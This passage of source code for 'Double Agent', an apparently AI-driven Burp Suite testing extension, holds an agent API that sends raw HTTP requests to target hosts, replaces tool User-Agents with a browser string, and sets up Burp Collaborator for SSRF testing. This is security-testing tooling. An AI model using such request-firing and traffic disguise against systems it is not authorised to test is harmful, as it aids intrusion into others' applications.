                    "pseudoHeaders": pseudo_headers,
                    "headers_count": len(headers),
                    "requestBody_length": len(str(request_body or ""))
                },
                "result": result,
                "note": "HTTP/2 execution is delegated to the PortSwigger MCP extension on port 9876."
            })
        except Exception as e:
            self._send_json(503, {
                "error": "portswigger mcp http2 request failed",
                "message": self._safe_ascii_text(e, 1000),
                "mcp_url": str(getattr(self.extender, "PORTSWIGGER_MCP_URL", "")),
                "fallback": "Use the PortSwigger MCP tool send_http2_request directly, or use POST /api/agent/request for HTTP/1.1 fallback when protocol fidelity is not required."
            })

    def _handle_agent_request(self):
        """Fire an HTTP request through Burp's HTTP stack and return the response as JSON."""
        try:
            body = self._read_body()
        except Exception as e:
            self._send_json(400, {"error": "invalid body", "message": str(e)})
            return

        host = str(body.get("host", "")).strip()
        port = body.get("port", 443)
        use_https = bool(body.get("https", True))
        raw_request = body.get("request", "")
        comment = self._limit_text(body.get("comment", body.get("note", "")), 250)

        if not host or not raw_request:
            self._send_json(400, {"error": "host and request are required"})
            return

        try:
            port = int(port)
        except:
            self._send_json(400, {"error": "port must be an integer"})
            return

        try:
            helpers = self.extender.helpers
            # Build IHttpService
            http_service = helpers.buildHttpService(host, port, use_https)
            # Normalise line endings and replace any curl/tool UA with a real browser string
            BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            raw_request = re.sub(
                r'(?im)^User-Agent:.*$',
                'User-Agent: ' + BROWSER_UA,
                raw_request
            )
            # If no User-Agent header present at all, inject one after the first line
            if not re.search(r'(?im)^User-Agent:', raw_request):
                raw_request = re.sub(
                    r'(\r?\n)',
                    '\r\nUser-Agent: ' + BROWSER_UA,
                    raw_request,
                    count=1
                )
            # Encode the raw request string to bytes
            if isinstance(raw_request, unicode):
                request_bytes = raw_request.encode('utf-8')
            else:
                request_bytes = raw_request
            # Make the request through Burp's HTTP stack
            response_obj = self.extender.callbacks.makeHttpRequest(http_service, request_bytes)
            object_comment_set = False
            history_comment_set = False
            if comment:
                try:
                    response_obj.setComment(comment)
                    object_comment_set = True
                except Exception as comment_err:
                    self.extender.stderr.println("[AGENT API] agent/request comment error: %s" % self.extender._safe_ascii_text(comment_err))
                try:
                    history_comment_set = bool(self.extender._annotate_recent_proxy_history(
                        http_service, request_bytes, comment
                    ))
                except Exception as history_comment_err:
                    self.extender.stderr.println("[AGENT API] agent/request proxy-history comment error: %s" % self.extender._safe_ascii_text(history_comment_err))
            response_bytes = response_obj.getResponse()
            if response_bytes is None:
                self._send_json(502, {"error": "no response received"})
                return
            # Parse response
            analyzed = helpers.analyzeResponse(response_bytes)
            status_code = analyzed.getStatusCode()
            resp_headers = [str(h) for h in analyzed.getHeaders()]
            body_offset = analyzed.getBodyOffset()
            try:
                resp_body = helpers.bytesToString(response_bytes[body_offset:])
            except:
                resp_body = "[binary response body]"
            self.extender.stdout.println("[AGENT API] agent/request: %s:%d %s -> HTTP %d comment=%s object=%s history=%s" % (
                host, port, "HTTPS" if use_https else "HTTP", status_code,
                "yes" if comment else "no",
                "yes" if object_comment_set else "no",
                "yes" if history_comment_set else "no"))
            self._send_json(200, {
                "status_code": int(status_code),
                "headers": resp_headers,
                "body": resp_body,
                "comment": comment,
                "comment_set": bool(object_comment_set or history_comment_set),
                "comment_set_on_response_object": bool(object_comment_set),
                "comment_set_on_proxy_history": bool(history_comment_set)
            })
        except Exception as e:
            self.extender.stderr.println("[AGENT API] agent/request error: %s" % str(e))
            self._send_json(500, {"error": "request failed", "message": str(e)})

if HAS_WEBSOCKET_LISTENER and HAS_SCANNER_LISTENER:
    class _BurpExtenderBase(IBurpExtender, IHttpListener, IScannerCheck, ITab, IContextMenuFactory, IExtensionStateListener, IWebSocketListener, IScannerListener):
        pass
elif HAS_WEBSOCKET_LISTENER:
    class _BurpExtenderBase(IBurpExtender, IHttpListener, IScannerCheck, ITab, IContextMenuFactory, IExtensionStateListener, IWebSocketListener):
        pass
elif HAS_SCANNER_LISTENER:
    class _BurpExtenderBase(IBurpExtender, IHttpListener, IScannerCheck, ITab, IContextMenuFactory, IExtensionStateListener, IScannerListener):
        pass
else:
    class _BurpExtenderBase(IBurpExtender, IHttpListener, IScannerCheck, ITab, IContextMenuFactory, IExtensionStateListener):
        pass

class BurpExtender(_BurpExtenderBase):
    def _workspace_directory(self):
        try:
            project_dir = str(getattr(self, "PROJECT_WORKSPACE_DIR", "") or "").strip()
            if project_dir and os.path.isdir(project_dir):
                return os.path.abspath(project_dir)
        except Exception:
            pass
        try:
            return os.getcwd()
        except Exception:
            return "."

    def _read_workspace_text(self, name, limit=100000):
        path = os.path.join(self._workspace_directory(), name)
        if not os.path.isfile(path):
            return ""
        try:
            fh = open(path, "rb")
            try:
                data = fh.read(limit)
            finally:
                fh.close()
            return data.decode("utf-8", "replace") if hasattr(data, "decode") else str(data)
        except Exception:
            return ""

    def _extract_scope_hosts(self, scope_text):
        hosts = []
        seen = set()
        pattern = re.compile(r'(?i)(\*\.)?([a-z0-9][a-z0-9.-]*\.[a-z]{2,})(?::\d+)?')
        for match in pattern.finditer(str(scope_text or "")):
            host = (match.group(1) or "") + (match.group(2) or "")
            host = host.strip(".,;:()[]{}<>\"'").lower()
            if host and host not in seen:
                seen.add(host)
                hosts.append(host)
        return hosts[:200]

    def _normalize_project_workspace_dir(self, path):
        try:
            path = str(path or "").strip()
            if not path:
                return ""
            resolved = os.path.abspath(os.path.expanduser(path))
            if self._unsafe_persistence_directory(resolved):
                return ""
            if not os.path.isdir(resolved):
                os.makedirs(resolved)
            if not os.access(resolved, os.W_OK):
                return ""
            return resolved
        except Exception:
            pass
        return ""

    def _project_workspace_prompt_start_dir(self):
        try:
            for candidate in [
                getattr(self, "PROJECT_WORKSPACE_DIR", ""),
                getattr(self, "PROJECT_ROOT_DIR", ""),
                os.path.expanduser("~")
            ]:
                try:
                    candidate = os.path.abspath(os.path.expanduser(str(candidate or "")))
                    if candidate and os.path.isdir(candidate) and not self._unsafe_persistence_directory(candidate):
                        return candidate
                except Exception:
                    continue
        except Exception:
            pass
        return os.path.expanduser("~")

    def _prompt_for_project_workspace_directory_on_load(self):
        """Ask which assessment folder should own this extension session."""
        try:
            from javax.swing import JFileChooser, JOptionPane
            start_dir = self._project_workspace_prompt_start_dir()
            chooser = JFileChooser(start_dir)
            chooser.setDialogTitle("Choose Double Agent Project Folder")
            chooser.setApproveButtonText("Use This Folder")
            chooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY)
            chooser.setAcceptAllFileFilterUsed(False)
            result = chooser.showOpenDialog(None)
            if result == JFileChooser.APPROVE_OPTION:
                selected = chooser.getSelectedFile()
                if selected is not None:
                    resolved = self._normalize_project_workspace_dir(selected.getAbsolutePath())
                    if resolved:
                        self.PROJECT_WORKSPACE_DIR = resolved
                        self.save_config()
                        self.stdout.println("[PERSIST] Project folder selected: %s" % resolved)
                        return True
                    JOptionPane.showMessageDialog(
                        None,
                        "Double Agent cannot write to the selected folder.",
                        "Project Folder Not Writable",
                        JOptionPane.WARNING_MESSAGE
                    )

            fallback = self._normalize_project_workspace_dir(getattr(self, "PROJECT_WORKSPACE_DIR", ""))
            if fallback:
                self.PROJECT_WORKSPACE_DIR = fallback
                self.stdout.println("[PERSIST] Project folder prompt cancelled; using configured folder: %s" % fallback)
                return False

            fallback = self._normalize_project_workspace_dir(os.path.join(os.path.expanduser("~"), ".double-agent"))
            if fallback:
                self.PROJECT_WORKSPACE_DIR = fallback
                self.save_config()
                self.stdout.println("[PERSIST] Project folder prompt cancelled; using fallback folder: %s" % fallback)
                return False
        except Exception as e:
            try:
                self.stderr.println("[PERSIST] Project folder prompt failed: %s" % self._safe_ascii_text(e))
            except Exception:
                pass
        return False

    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()
        
        # Store original writers
        original_stdout = PrintWriter(callbacks.getStdout(), True)
        original_stderr = PrintWriter(callbacks.getStderr(), True)
        
        # Wrap to capture console output
        self.stdout = ConsolePrintWriter(original_stdout, self)
        self.stderr = ConsolePrintWriter(original_stderr, self)

        # Burp Collaborator (for SSRF testing)
        try:
            self.collaborator = callbacks.createBurpCollaboratorClient()
            self.stdout.println("[COLLABORATOR] Burp Collaborator client initialized successfully")
        except AttributeError:
            # Try alternative method name for newer Burp versions
            try:
                self.collaborator = callbacks.createBurpCollaboratorClientContext()
                self.stdout.println("[COLLABORATOR] Burp Collaborator client context initialized successfully")
            except Exception as _alt_ex:
                self.collaborator = None
                self.stdout.println("[COLLABORATOR] Warning: Could not initialize Burp Collaborator (tried both methods): %s" % str(_alt_ex))
        except Exception as _collab_ex:
            self.collaborator = None
            self.stdout.println("[COLLABORATOR] Warning: Could not initialize Burp Collaborator: %s" % str(_collab_ex))

        # Version Information
        self.VERSION = "2.1"
        self.RELEASE_DATE = "2026-05-29"
        self.PRODUCT_NAME = "Double Agent"
        self.BUILD_ID = "bb90850f-1d2e-4d12-852e-842527475b37"

        callbacks.setExtensionName("%s v%s" % (self.PRODUCT_NAME, self.VERSION))
        callbacks.registerHttpListener(self)
        callbacks.registerContextMenuFactory(self)
        callbacks.registerExtensionStateListener(self)
        if HAS_WEBSOCKET_LISTENER:
            callbacks.registerWebSocketListener(self)
            self.stdout.println("[+] WebSocket listener registered")
        else:
            self.stdout.println("[*] WebSocket listener not available in this Burp version")
        if HAS_SCANNER_LISTENER:
            callbacks.registerScannerListener(self)
            self.stdout.println("[+] Scanner listener registered (ingests Burp active/passive scan issues into findings)")

        # Configuration file path (in user's home directory)
        import os
        self.config_file = os.path.join(os.path.expanduser("~"), ".double_agent_ai_config.json")
        self.PROJECT_ROOT_DIR = os.environ.get("DOUBLE_AGENT_PROJECT_ROOT", "/Users/seang/PENTESTS")
        self.PROJECT_WORKSPACE_DIR = os.environ.get("DOUBLE_AGENT_PROJECT_DIR", os.path.join(self.PROJECT_ROOT_DIR, "GPT"))
        self.PORTSWIGGER_MCP_URL = os.environ.get("PORTSWIGGER_MCP_URL", "http://127.0.0.1:9876/")
        
        # AI Provider Settings (defaults - will be overridden by saved config)
        self.AI_PROVIDER = "Ollama"  # Options: Ollama, OpenAI, Claude, Gemini, Bedrock, DeepSeek
        self.API_URL = "http://localhost:11434"
        self.API_KEY = ""  # For OpenAI, Claude, Gemini, DeepSeek
        self.API_KEYS_PER_PROVIDER = {}  # Provider name -> API key
        self.MODEL = "deepseek-r1:latest"
        self.BEDROCK_REGION = "us-east-1"
        self.BEDROCK_FIXED_MODEL = "us.anthropic.claude-sonnet-4-6"
        self.MAX_TOKENS = 4096
        self.AI_REQUEST_TIMEOUT = 60  # Timeout for AI requests in seconds (default: 60)
        self.ANALYSIS_WORKERS = 1     # Concurrent analysis workers (reduced to 1 for stability)
        self.AI_REQUEST_CONCURRENCY = 2  # Max simultaneous provider calls; prevents Bedrock timeout storms
        self.MIN_BEDROCK_REQUEST_TIMEOUT = 120
        self.available_models = []

        self.VERBOSE = True
        self.THEME = "Auto"  # Auto-detect Burp's theme; options: Auto, Light, Dark
        self.PASSIVE_SCANNING_ENABLED = True  # Analyze completed proxy traffic (context menu still works)
        self.PROXY_DEDUPE_ENABLED = True      # Exact URL+method dedupe for proxy auto-analysis
        self.MAX_QUEUED_ANALYSES = 12         # Manual/context backlog cap
        self.MAX_PROXY_QUEUED_ANALYSES = 3    # Stricter cap for automatic Proxy traffic
        self.PROXY_ANALYSIS_MIN_INTERVAL_SECONDS = 1.0  # Proxy intake throttle for UI responsiveness
        self.PASSIVE_HIGH_VALUE_SCORE = 2     # API/auth/member/GraphQL requests bypass coarse proxy throttle
        self.MAX_HIGH_VALUE_PROXY_QUEUED_ANALYSES = 8
        self.MIN_SCAN_OUTPUT_TOKENS = 4096    # Avoid truncating long JSON findings/active recipes
        self.PROXY_UI_LAZY_REFRESH = True     # Let timer refresh proxy-task UI instead of every completion
        self.PERF_DEBUG_ENABLED = False       # Perf diagnostics stay silent unless reworked into non-console telemetry.
        self.PERF_DEBUG_SLOW_MS = 75

        # Custom system prompts (if set, replaces the built-in prompt)
        self.CUSTOM_SCAN_PROMPT = ""  # Custom per-request analysis prompt
        self.CUSTOM_FLOW_PROMPT = ""  # Custom agent bootstrap/flow prompt

        # Context enrichment for improved accuracy
        self.CONTEXT_ENRICHMENT_ENABLED = True  # Enable neighboring requests + tech fingerprinting
        self.CONTEXT_NEIGHBOR_COUNT = 2  # Number of requests before/after to include
        self.CONTEXT_MAX_AGE_MINUTES = 10  # Max age of neighboring requests to consider

        # File extensions to skip during analysis (static/binary/non-security-relevant files only)
        # XML, JS, JSON and other files are security-relevant and should be analyzed
        self.SKIP_EXTENSIONS = [
            "gif", "jpg", "jpeg", "png", "ico", "css", "woff", "woff2", "ttf", "svg",
            "mp4", "m4v", "mov", "webm", "avi", "mp3", "wav", "ogg", "pdf", "zip", "gz"
        ]

        # Findings state (must exist before load_findings is called)
        self.findings_list = []
        self.findings_lock_ui = threading.Lock()
        self.fp_suppressed = set()
        self._show_fp_findings = False
        self.findings_cache = {}
        self.findings_lock = threading.Lock()

        # Console tracking (must exist before any load_* calls that use log_to_console)
        self.console_messages = []
        self.console_lock = threading.Lock()
        self.max_console_messages = 1000

        # Agent API server + bidirectional work queue (must exist before load_agent_queue is called)
        self.agent_server = None
        self.agent_server_thread = None
        self.agent_server_port = 8777
        self.agent_server_host = "127.0.0.1"
        self.agent_server_token = ""
        self.agent_queue = []
        self.agent_queue_lock = threading.Lock()
        self.agent_queue_next_id = 0
        self.selected_agent_queue_index = -1
        self.agent_api_last_request = 0
        self.agent_api_min_interval = 0.1  # Minimum 100ms between API requests
        self._deleted_finding_indices_pending_queue_remap = []
        self._findings_load_cleanup_pending_save = False
        self.MAX_AGENT_QUEUE_SIZE = 50  # Max queue items to prevent memory bloat
        # Stale claim recovery: auto-release work items claimed but inactive for too long.
        # Heartbeat resets the timer; if no result/heartbeat within this window the item
        # goes back to "pending" so another agent (or the same one after restart) can claim it.
        self.AGENT_CLAIM_TIMEOUT_SEC = 900  # 15 minutes

        # Passive scan cache state (must exist before load_findings restores persisted cache)
        self.processed_urls = {}  # url_hash -> timestamp
        self.queued_url_hashes = set()
        self.passive_scan_cache = {}  # url_hash -> persisted scan ledger entry
        self.PASSIVE_SCAN_CACHE_MAX_ENTRIES = 5000
        self.PASSIVE_SCAN_FAILURE_RETRY_SECONDS = 120
        self._last_reserve_skip_reason = ""
        self.url_lock = threading.Lock()
        self.PROCESSED_URL_EXPIRY_SECONDS = 3600  # Re-analyze URLs after 1 hour

        # Load saved configuration (if exists)
        self.load_config()
        self._prompt_for_project_workspace_directory_on_load()
        self.load_findings()
        self.load_agent_queue()

        # UI refresh control
        self._ui_dirty = True           # Flag: data changed since last refresh
        self._refresh_pending = False   # Guard: refresh already queued on EDT
        self._last_console_len = 0      # Track console length for incremental append
        self._ui_refresh_seq = 0
        self._last_ui_refresh_queued_at = 0
        self._last_ui_refresh_started_at = 0
        self._last_ui_refresh_completed_at = 0
        self._perf_debug_last = {}
        self._http_listener_count = 0
        self._ai_thread_state = threading.local()


        # Agent AI assessments tracking (legacy AI-provider mode)
        self.agent_assessments = []
        self.agent_assessments_lock = threading.Lock()
        self.selected_agent_assessment_index = -1
        
        # Context menu debounce
        self.context_menu_last_invoke = {}
        self.context_menu_debounce_time = 1.0
        self.context_menu_lock = threading.Lock()
        self.semaphore = threading.Semaphore(max(1, int(self.ANALYSIS_WORKERS)))
        self.AI_REQUEST_CONCURRENCY = max(1, int(getattr(self, "AI_REQUEST_CONCURRENCY", 2)))
        self._ai_request_semaphore = threading.Semaphore(self.AI_REQUEST_CONCURRENCY)
        self.MAX_QUEUED_ANALYSES = max(1, int(getattr(self, "MAX_QUEUED_ANALYSES", 12)))
        self.MAX_PROXY_QUEUED_ANALYSES = max(1, int(getattr(self, "MAX_PROXY_QUEUED_ANALYSES", 3)))
        self.PROXY_ANALYSIS_MIN_INTERVAL_SECONDS = max(0.0, float(getattr(self, "PROXY_ANALYSIS_MIN_INTERVAL_SECONDS", 1.0)))
        self._last_proxy_analysis_queued_at = 0
        self._active_analysis_threads = 0
        self._analysis_thread_lock = threading.Lock()
        self.rate_limit_lock = threading.Lock()
        self.last_request_time = 0
        self.min_delay = 4.0

        # Task tracking
        self.tasks = []
        self.tasks_lock = threading.Lock()
        self.control_lock = threading.Lock()
        self.pause_all = False
        self.cost_pause_interval_usd = 5.0
        self.next_cost_pause_threshold_usd = 5.0
        self.stats = {
            "total_requests": 0,
            "analyzed": 0,
            "skipped_duplicate": 0,
            "skipped_rate_limit": 0,
            "skipped_backpressure": 0,
            "skipped_retry_cooldown": 0,
            "skipped_low_confidence": 0,
            "findings_created": 0,
            "errors": 0,
            "estimated_cost_usd": 0.0
        }
        self.stats_lock = threading.Lock()
        self.token_pricing_per_1k = {
            "Ollama": {"input": 0.0, "output": 0.0},
            "OpenAI": {"input": 0.0025, "output": 0.010},
            "Claude": {"input": 0.003, "output": 0.015},
            "Gemini": {"input": 0.00125, "output": 0.005},
            "Bedrock": {"input": 0.0, "output": 0.0},
            "DeepSeek": {"input": 0.00014, "output": 0.00028}
        }
        self.openai_model_pricing_per_1k = {
            "gpt-4o-mini": {"input": 0.00015, "output": 0.0006},
            "gpt-4o": {"input": 0.0025, "output": 0.010}
        }
        self.bedrock_model_pricing_per_1k = {
            "anthropic.claude-3-haiku": {"input": 0.00025, "output": 0.00125},
            "anthropic.claude-3-5-haiku": {"input": 0.0008, "output": 0.004},
            "anthropic.claude-3-sonnet": {"input": 0.003, "output": 0.015},
            "anthropic.claude-3-5-sonnet": {"input": 0.003, "output": 0.015},
            "anthropic.claude-3-7-sonnet": {"input": 0.003, "output": 0.015},
            "anthropic.claude-sonnet-4-6": {"input": 0.003, "output": 0.015},
            "us.anthropic.claude-sonnet-4-6": {"input": 0.003, "output": 0.015},
            "anthropic.claude-3-opus": {"input": 0.015, "output": 0.075}
        }
        self._pricing_warning_cache = set()
        self._bedrock_usage_estimate_warned = False

        # Create UI
        self.initUI()
        
        self.log_to_console("=== %s v%s Initialized ===" % (self.PRODUCT_NAME, self.VERSION))
        self.log_to_console("Console panel is active and logging...")
        
        # Force immediate UI refresh
        self.refreshUI()
        
        # Display logo
        self.print_logo()
        
        self.stdout.println("[+] Version: %s (Released: %s)" % (self.VERSION, self.RELEASE_DATE))
        self.stdout.println("[+] AI Provider: %s" % self.AI_PROVIDER)
        self.stdout.println("[+] API URL: %s" % self.API_URL)
        self.stdout.println("[+] Model: %s" % self.MODEL)
        self.stdout.println("[+] Max Tokens: %d" % self.MAX_TOKENS)
        self.stdout.println("[+] Request Timeout: %d seconds" % self.AI_REQUEST_TIMEOUT)
        self.stdout.println("[+] Deduplication: ENABLED")
        self.stdout.println("")
        self.stdout.println("[*] Double Agent ready")

        # Test AI connection in background thread (non-blocking startup)
        def _startup_connection_test():
            connection_ok = self.test_ai_connection()
            if not connection_ok:
                self.stderr.println("\n[!] WARNING: AI connection test failed!")
                self.stderr.println("[!] Extension will not function properly until connection is established.")
                self.stderr.println("[!] Please check Settings and verify your AI configuration.")
        _conn_thread = threading.Thread(target=_startup_connection_test)
        _conn_thread.setDaemon(True)
        _conn_thread.start()

        # Add UI tab
        callbacks.addSuiteTab(self)
        
        # Start auto-refresh timer for Console
        self.start_auto_refresh_timer()

    def initUI(self):
        # Main panel
        self.panel = JPanel(BorderLayout())
        
        # Top panel with stats
        topPanel = JPanel()
        topPanel.setLayout(BoxLayout(topPanel, BoxLayout.Y_AXIS))
        topPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))
        
        # Title
        titleLabel = JLabel("%s v%s" % (self.PRODUCT_NAME, self.VERSION))
        titleLabel.setFont(Font("Monospaced", Font.BOLD, 16))
        titlePanel = JPanel()
        titlePanel.add(titleLabel)
        topPanel.add(titlePanel)
        
        # Product subtitle
        subtitleLabel = JLabel("AI-Powered Application Testing for BurpSuite")
        subtitleLabel.setFont(Font("Dialog", Font.ITALIC, 12))
        subtitleLabel.setForeground(Color(0xD5, 0x59, 0x35))
        subtitlePanel = JPanel()
        subtitlePanel.add(subtitleLabel)
        topPanel.add(subtitlePanel)

        topPanel.add(Box.createRigidArea(Dimension(0, 10)))

        # Internal stats are still tracked for diagnostics, but the usage stats
        # widget is intentionally not shown in the main UI.
        self.statsLabels = {}
        
        # Control panel
        controlPanel = JPanel()
        
        # Settings button
        self.settingsButton = JButton("Settings", actionPerformed=self.openSettings)
        
        self.clearFindingsButton = JButton("Clear Findings", actionPerformed=self.clearFindings)
        
        # Cancel/Pause all buttons (kill switches)
        self.cancelAllButton = JButton("Stop Analysis", actionPerformed=self.cancelAllTasks)
        
        self.pauseAllButton = JButton("Pause Analysis", actionPerformed=self.pauseAllTasks)
        
        controlPanel.add(self.settingsButton)
        controlPanel.add(self.clearFindingsButton)
        controlPanel.add(self.cancelAllButton)
        controlPanel.add(self.pauseAllButton)
        
        # Passive scanning toggle
        self.passiveScanCheck = JCheckBox("Analyze Proxy Traffic ($$)", self.PASSIVE_SCANNING_ENABLED)
        self.passiveScanCheck.setToolTipText("WARNING: analyzes completed in-scope HTTP responses that pass through Burp Proxy. This can consume API tokens/cost quickly.")
        def onPassiveScanToggle(e):
            self.PASSIVE_SCANNING_ENABLED = self.passiveScanCheck.isSelected()
            self.stdout.println("[SETTINGS] Proxy traffic analysis: %s" % ("Enabled" if self.PASSIVE_SCANNING_ENABLED else "Disabled"))
            self.save_config()
        self.passiveScanCheck.addActionListener(onPassiveScanToggle)
        controlPanel.add(self.passiveScanCheck)

        self.proxyDedupeCheck = JCheckBox("Dedupe Proxy Traffic", self.PROXY_DEDUPE_ENABLED)
        self.proxyDedupeCheck.setToolTipText("Skip exact duplicate method+URL proxy traffic within the analysis window.")
        def onProxyDedupeToggle(e):
            self.PROXY_DEDUPE_ENABLED = self.proxyDedupeCheck.isSelected()
            self.stdout.println("[SETTINGS] Proxy traffic dedupe: %s" % ("Enabled" if self.PROXY_DEDUPE_ENABLED else "Disabled"))
            self.save_config()
        self.proxyDedupeCheck.addActionListener(onProxyDedupeToggle)
        controlPanel.add(self.proxyDedupeCheck)

        self.consoleWindowCheck = JCheckBox("Show Console Window", False)
        self.consoleWindowCheck.setToolTipText("Open/close the console in a separate window")
        self.consoleWindowCheck.addActionListener(self.toggleConsoleWindow)
        controlPanel.add(self.consoleWindowCheck)
        
        topPanel.add(controlPanel)
        
        self.panel.add(topPanel, BorderLayout.NORTH)
        
        # Workspace tabs: Activity, Findings, Agent AI, Report
        from javax.swing import JTabbedPane, JPopupMenu
        self.workspaceTabs = JTabbedPane()

        # ===== ACTIVITY TAB =====
        activityPanel = JPanel(BorderLayout())
        activityToolbar = JPanel(FlowLayout(FlowLayout.LEFT))
        activityToolbar.add(JLabel("Recent meaningful analysis activity"))
        activityPanel.add(activityToolbar, BorderLayout.NORTH)

        self.taskTableModel = DefaultTableModel()
        self.taskTableModel.addColumn("Timestamp")
        self.taskTableModel.addColumn("Type")
        self.taskTableModel.addColumn("URL")
        self.taskTableModel.addColumn("Status")
        self.taskTableModel.addColumn("Duration")

        self.taskTable = JTable(self.taskTableModel)
        self.taskTable.setAutoCreateRowSorter(True)
        self.taskTable.getColumnModel().getColumn(0).setPreferredWidth(150)
        self.taskTable.getColumnModel().getColumn(1).setPreferredWidth(120)
        self.taskTable.getColumnModel().getColumn(2).setPreferredWidth(300)
        self.taskTable.getColumnModel().getColumn(3).setPreferredWidth(130)
        self.taskTable.getColumnModel().getColumn(4).setPreferredWidth(80)

        # Apply theme-aware base renderer to all columns, then override specific ones
        baseRenderer = ThemeAwareCellRenderer(self)
        for col_idx in range(self.taskTable.getColumnModel().getColumnCount()):
            self.taskTable.getColumnModel().getColumn(col_idx).setCellRenderer(baseRenderer)
        statusRenderer = StatusCellRenderer(self)
        self.taskTable.getColumnModel().getColumn(3).setCellRenderer(statusRenderer)
        self.taskTable.getColumnModel().getColumn(2).setCellRenderer(TruncatedUrlCellRenderer(60, self))
        self.taskTable.getTableHeader().setDefaultRenderer(ThemeAwareHeaderRenderer(self))
        self._add_column_resize_cursor(self.taskTable)

        # Add right-click context menu for rescan
        from javax.swing import JPopupMenu
        self.taskPopupMenu = JPopupMenu()
        rescanItem = JMenuItem("Rescan")
        def onRescan(e):
            self._rescanSelectedTask()
        rescanItem.addActionListener(onRescan)
        self.taskPopupMenu.add(rescanItem)
        self.taskTable.setComponentPopupMenu(self.taskPopupMenu)

        activityPanel.add(JScrollPane(self.taskTable), BorderLayout.CENTER)
        self.workspaceTabs.addTab("Activity", activityPanel)
        self._activityTabIndex = self.workspaceTabs.getTabCount() - 1

        # ===== FINDINGS TAB =====
        findingsPanel = JPanel(BorderLayout())

        # Findings stats bar
        findingsStatsPanel = JPanel(FlowLayout(FlowLayout.LEFT))
        self.findingsStatsLabel = JLabel("Total: 0 | Crit: 0 | High: 0 | Medium: 0 | Low: 0 | Info: 0")
        self.findingsStatsLabel.setFont(Font("Monospaced", Font.BOLD, 11))
        self._showFPBtn = JButton("Show Hidden")
        self._showFPBtn.setFont(Font("Monospaced", Font.PLAIN, 11))
        self._showFPBtn.setFocusPainted(False)
        self._showFPBtn.addActionListener(lambda e: self._toggleShowFP())
        findingsStatsPanel.add(self.findingsStatsLabel)
        findingsStatsPanel.add(self._showFPBtn)
        findingsPanel.add(findingsStatsPanel, BorderLayout.NORTH)
        
        self.findingsTableModel = DefaultTableModel()
        self.findingsTableModel.addColumn("#")
        self.findingsTableModel.addColumn("URL")
        self.findingsTableModel.addColumn("Finding")
        self.findingsTableModel.addColumn("Severity")
        self.findingsTableModel.addColumn("Confidence")
        self.findingsTableModel.addColumn("Agent Status")
        self.findingsTableModel.addColumn("Agent Priority")

        self.findingsTable = JTable(self.findingsTableModel)
        self.findingsTable.setAutoCreateRowSorter(True)
        self.findingsTable.setAutoResizeMode(JTable.AUTO_RESIZE_SUBSEQUENT_COLUMNS)
        self.findingsTable.setFont(Font("Dialog", Font.PLAIN, 11))
        self.findingsTable.setRowHeight(18)

        # Custom sorting for Severity and Confidence columns
        from java.util import Comparator
        from javax.swing.table import TableRowSorter

        class IntComparator(Comparator):
            def compare(self, o1, o2):
                try:
                    return int(o1) - int(o2)
                except:
                    return 0

        class SeverityComparator(Comparator):
            def __init__(self):
                self.order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Information": 4}
            def compare(self, o1, o2):
                return self.order.get(str(o1) if o1 else "", 5) - self.order.get(str(o2) if o2 else "", 5)

        class ConfidenceComparator(Comparator):
            def __init__(self):
                self.order = {"Certain": 0, "Firm": 1, "Tentative": 2}
            def compare(self, o1, o2):
                return self.order.get(str(o1) if o1 else "", 3) - self.order.get(str(o2) if o2 else "", 3)

        class PriorityComparator(Comparator):
            def __init__(self):
                self.order = {"P1": 0, "P2": 1, "P3": 2, "P4": 3, "defer": 5, "": 6}
            def compare(self, o1, o2):
                return self.order.get(str(o1) if o1 else "", 6) - self.order.get(str(o2) if o2 else "", 6)

        sorter = TableRowSorter(self.findingsTableModel)
        sorter.setComparator(0, IntComparator())
        sorter.setComparator(3, SeverityComparator())
        sorter.setComparator(4, ConfidenceComparator())
        sorter.setComparator(6, PriorityComparator())
        self.findingsTable.setRowSorter(sorter)
        # Sort by Confidence ascending (Certain first), then Severity ascending (Critical first)
        from javax.swing import SortOrder
        from javax.swing import RowSorter
        sorter.setSortKeys([
            RowSorter.SortKey(4, SortOrder.ASCENDING),  # Confidence: Certain > Firm > Tentative
            RowSorter.SortKey(3, SortOrder.ASCENDING),  # Severity: Critical > High > Medium > Low
        ])
        self.findingsSorter = sorter
        self._fp_row_filter = FPRowFilter(self)
        sorter.setRowFilter(self._fp_row_filter)

        self.findingsTable.getColumnModel().getColumn(0).setPreferredWidth(35)   # #
        self.findingsTable.getColumnModel().getColumn(0).setMaxWidth(50)
        self.findingsTable.getColumnModel().getColumn(1).setPreferredWidth(400)  # URL
        self.findingsTable.getColumnModel().getColumn(1).setMinWidth(200)
        self.findingsTable.getColumnModel().getColumn(2).setPreferredWidth(500)  # Finding
        self.findingsTable.getColumnModel().getColumn(2).setMinWidth(200)
        self.findingsTable.getColumnModel().getColumn(3).setPreferredWidth(80)   # Severity
        self.findingsTable.getColumnModel().getColumn(3).setMinWidth(70)
        self.findingsTable.getColumnModel().getColumn(4).setPreferredWidth(90)   # Confidence
        self.findingsTable.getColumnModel().getColumn(4).setMinWidth(80)
        self.findingsTable.getColumnModel().getColumn(5).setPreferredWidth(130)  # Agent Status
        self.findingsTable.getColumnModel().getColumn(5).setMinWidth(100)
        self.findingsTable.getColumnModel().getColumn(6).setPreferredWidth(90)   # Agent Priority
        self.findingsTable.getColumnModel().getColumn(6).setMinWidth(70)

        # Apply theme-aware base renderer to all columns, then override specific ones
        baseRenderer = ThemeAwareCellRenderer(self)
        for col_idx in range(self.findingsTable.getColumnModel().getColumnCount()):
            self.findingsTable.getColumnModel().getColumn(col_idx).setCellRenderer(baseRenderer)
        severityRenderer = SeverityCellRenderer(self)
        confidenceRenderer = ConfidenceCellRenderer(self)
        self.findingsTable.getColumnModel().getColumn(3).setCellRenderer(severityRenderer)
        self.findingsTable.getColumnModel().getColumn(4).setCellRenderer(confidenceRenderer)
        self.findingsTable.getTableHeader().setDefaultRenderer(ThemeAwareHeaderRenderer(self))
        self._add_column_resize_cursor(self.findingsTable)

        # Selection listener for detail panel (#1)
        from javax.swing.event import ListSelectionListener
        class FindingsSelectionListener(ListSelectionListener):
            def __init__(self, extender):
                self.extender = extender
            def valueChanged(self, e):
                if not e.getValueIsAdjusting():
                    self.extender._updateFindingDetailPanel()
